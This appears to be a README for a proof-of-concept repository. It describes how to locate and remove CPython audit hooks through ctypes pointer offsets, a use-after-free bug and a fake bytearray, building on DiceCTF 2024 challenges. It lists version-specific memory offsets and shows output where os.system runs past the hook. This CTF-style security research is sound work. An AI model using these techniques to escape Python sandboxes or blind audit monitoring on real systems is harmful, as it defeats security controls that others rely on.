# python audit_hooks head finder

This POC intends to show how to find the audit hook and use `ctypes` to pop it (~~SMASH it~~).

The idea is inspired by `misc/diligent-auditor` and `misc/IRS` challeneges and their solve scripts from [dicectf-quals-2024 CTF](https://github.com/dicegang/dicectf-quals-2024-challenges/).

# Ref
Diligent auditor from *organizers*: <https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/>  
IRS writeup from *Maple Bacon*: <https://maplebacon.org/2024/02/dicectf2024-irs/>

## Tested environment
```
Python 3.12.4 (main, Jun  7 2024, 06:33:07) [GCC 14.1.1 20240522] on linux
Python 3.12.3 (tags/v3.12.3:f6650f9ad7, Jun 24 2024, 16:32:34) [GCC 14.1.1 20240522] on linux
Python 3.12.1 (tags/v3.12.1:2305ca5144, Jun 24 2024, 18:55:02) [GCC 14.1.1 20240522] on linux
Python 3.11.9 (main, Jun 23 2024, 04:47:27) [GCC 14.1.1 20240522] on linux
```

## Offsets
### For ctypes
```python
# ONLY TESTED ON PYTHON 3.12 and 3.11
# the offsets are from POC.py
if sys.version_info[:2] == (3, 12):
    if sys.version_info[2] <= 3:
        PTR_OFFSET = [0x41448, -0x11df0] # <= 3.12.3
    else:
        PTR_OFFSET = [0x41448, -0x11e20] # for python3.12.4
else:
    # python 3.11
    PTR_OFFSET = [0xe00, -0xe388]
```

### For UAF
```python
# ONLY TESTED ON PYTHON 3.12 and 3.11
# the offsets are from POC-no-ctypes.py
# offset for audit hook set by Python and C
if sys.version_info[:2] == (3, 12):
    if sys.version_info[2] <= 3:
        PTR_OFFSET = [24, 48, 0x468f0, -0xc948] # <= 3.12.3
    else:
        PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
else:
    # there are multiple offsets for 3.11? check the result of POC-no-ctypes.py
    PTR_OFFSET = [24, 48, 0x4d558, 0x3e3d0]
```

## Smash Audit hook using `ctypes`
### Concept
For audit hook set in Python: according to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `GET_INTERP_ADDR()->audit_hooks` pointer under `PyInterpreterState`, we can cast `audit_hook` to `Py_ListObject` by address and pop it.  
For audit hook set in C: according to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `_PyRuntime.audit_hooks.head` pointer under `PyRuntimeState`, we can directly rewrite the head of audit hooks to `NULL`.
### How to use
```bash
# or ./build311.sh
./build.sh
./POC.py
./POC2.py
```

### Output
```bash
> ./POC.py
C audit hook triggered! event=sys.addaudithook
--- finished setup ---
PyInterpreterState_addr=0x64df082debe8
PyRuntimeState_addr=0x64df082cc180
PyInterpreterState.audit_hooks_ptr_addr=0x64df0831ffb0
PyRuntimeState.audit_hooks_ptr_addr=0x64df082ccd78

audit_hook_ptr_offset_by_py=0x41448
audit_hook_ptr_offset_by_c=-0x11df0
len=1 should be 1
C audit hook triggered! event=os.system
audit hook triggered! ('os.system', (b"echo 'test audit hook -- this will trigger hook'",))
test audit hook -- this will trigger hook
test audit hook -- this will not
> ./POC2.py
audit hook triggered! ('sys.addaudithook', ())
--- finished setup ---
C audit hook triggered! event=os.system
audit hook triggered! ('os.system', (b"echo 'test audit hook -- this will trigger hook'",))
test audit hook -- this will trigger hook
test audit hook -- this will not

```

## Smash Audit hook without `ctypes`
> ref: <https://maplebacon.org/2024/02/dicectf2024-irs/>

[UAF POC](./UAF-issue91153.md)
### How to use
```bash
# or ./build311.sh
# build the helper binary
./build.sh
# brute-force the offsets
./POC-no-ctypes.py
# verify the offsets works
./POC2-no-ctypes.py
```

## Smash Audit hook with fake bytearray
> ref: <https://www.da.vidbuchanan.co.uk/blog/35c3ctf-collection-writeup.html> and <https://github.com/gousaiyang/my-ctf-challenges/tree/master/PyAuCalc>  
> more context: <https://github.com/DavidBuchanan314/unsafe-python>

### How to use
```bash
./build.sh
./POC-fake-bytearray.py
```

## TODO
- [x] Use <https://github.com/python/cpython/issues/91153> to smash it without `ctypes`
- [x] Find a way to get the `audit_hook` address without using `ctypes`
- [ ] Use <https://bugs.python.org/issue43838> to smash it?
